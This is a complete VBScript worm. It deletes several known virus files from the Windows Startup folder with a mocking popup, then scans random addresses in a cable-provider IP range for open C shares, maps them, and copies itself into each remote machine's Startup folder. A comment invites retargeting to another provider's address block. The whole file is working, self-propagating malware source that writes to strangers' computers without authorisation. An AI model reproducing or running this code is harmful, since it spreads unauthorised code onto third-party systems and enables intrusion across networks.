set t=wscript.createobject("wscript.network")
set fso=createobject("scripting.filesystemobject")
set owsh =wscript.createobject("WScript.Shell")
on error resume next
randomize
do
do while w=0
if (fso.fileexists("c:\network.vbs")) then 
fso.deletefile("c:\network.vbs")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
if (fso.fileexists("c:\windows\startm~1\programs\startup\*.eml")) then 
fso.deletefile("c:\windows\startm~1\programs\startup\*.eml")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
if (fso.fileexists("c:\windows\startm~1\programs\startup\ttfload.vbs")) then 
fso.deletefile("c:\windows\startm~1\programs\startup\ttfload.vbs")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
if (fso.fileexists("c:\windows\startm~1\*.eml")) then 
fso.deletefile("c:\windows\startm~1\*.eml")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
if (fso.fileexists("c:\windows\startm~1\*.eml")) then 
fso.deletefile("c:\windows\startm~1\*.eml")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
if (fso.fileexists("c:\windows\startm~1\programs\startup\network.exe")) then 
fso.deletefile("c:\windows\startm~1\programs\startup\network.exe")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
if (fso.fileexists("c:\windows\startm~1\programs\startup\mscfg.exe")) then 
fso.deletefile("c:\windows\startm~1\programs\startup\mscfg.exe")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
if (fso.fileexists("c:\windows\startm~1\programs\startup\mscfg.vbs")) then 
fso.deletefile("c:\windows\startm~1\programs\startup\mscfg.vbs")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
if (fso.fileexists("c:\windows\startm~1\programs\startup\a.vbs")) then 
fso.deletefile("c:\windows\startm~1\programs\startup\a.vbs")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
if (fso.fileexists("c:\windows\startm~1\programs\startup\a24.vbs")) then 
fso.deletefile("c:\windows\startm~1\programs\startup\a24.vbs")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
if (fso.fileexists("c:\windows\startm~1\programs\startup\little.vbs")) then 
fso.deletefile("c:\windows\startm~1\programs\startup\little.vbs")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
if (fso.fileexists("c:\windows\startm~1\programs\startup\prince.vbs")) then
fso.deletefile("c:\windows\startm~1\programs\startup\prince.vbs")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
if (fso.fileexists("c:\windows\startm~1\programs\startup\MS StartUp Config.exe")) then 
fso.deletefile("c:\windows\startm~1\programs\startup\MS StartUp Config.exe")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
if (fso.fileexists("c:\windows\startm~1\programs\startup\_a.vbs")) then 
fso.deletefile("c:\windows\startm~1\programs\startup\_a.vbs")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
if (fso.fileexists("c:\windows\startm~1\programs\startup\_b.vbs")) then 
fso.deletefile("c:\windows\startm~1\programs\startup\_b.vbs")
owsh.popup "Virus Cleaned - how about getting a virus checker, PAL?" ,2
end if
' Note : modidy the next line to match cable provider's IP address block
n="\\65.33" &"."&int(254*rnd+1)&"."&int(254*rnd+1)&"\C"
t.mapnetworkdrive "x:",n
set o=t.enumnetworkdrives
for i=0 to o.Count-1
if n=o.item(i) then w=1
next
loop
fso.copyfile "c:\windows\startm~1\programs\startup\fixer.vbs", "x:\windows\startm~1\programs\startup\"
t.removenetworkdrive "x:"
w=0
loop
